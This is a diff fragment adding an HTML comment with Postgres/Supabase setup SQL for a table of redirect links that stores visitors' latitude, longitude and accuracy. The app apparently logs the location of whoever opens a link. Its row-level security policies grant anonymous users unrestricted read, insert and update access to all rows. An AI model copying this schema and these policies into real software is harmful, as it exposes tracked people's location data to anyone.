+    ════════════════════════════════════════════════════════
+
+    -- 1. Create the links table
+    CREATE TABLE IF NOT EXISTS public.links (
+      id          TEXT PRIMARY KEY,
+      redirect_url TEXT NOT NULL,
+      locations   JSONB NOT NULL DEFAULT '[]'::jsonb,
+      created_at  TIMESTAMPTZ NOT NULL DEFAULT now()
+    );
+
+    -- 2. Example INSERT (how the app inserts a new link)
+    -- INSERT INTO public.links (id, redirect_url, locations, created_at)
+    -- VALUES (
+    --   'abc123xyz',
+    --   'https://example.com',
+    --   '[]'::jsonb,
+    --   now()
+    -- );
+
+    -- 3. Example PATCH to append a location entry
+    -- UPDATE public.links
+    -- SET locations = locations || '[{"latitude":51.5074,"longitude":-0.1278,"accuracy":20,"timestamp":"2024-01-01T12:00:00Z"}]'::jsonb
+    -- WHERE id = 'abc123xyz';
+
+    -- 4. Row-Level Security (RLS)
+    --    Enable RLS then allow anon (public) reads + inserts
+    ALTER TABLE public.links ENABLE ROW LEVEL SECURITY;
+
+    CREATE POLICY "Allow anon read"
+      ON public.links FOR SELECT
+      USING (true);
+
+    CREATE POLICY "Allow anon insert"
+      ON public.links FOR INSERT
+      WITH CHECK (true);
+
+    CREATE POLICY "Allow anon update"
+      ON public.links FOR UPDATE
+      USING (true);
+
+    ════════════════════════════════════════════════════════
+    -->
+  </body>
+</html>
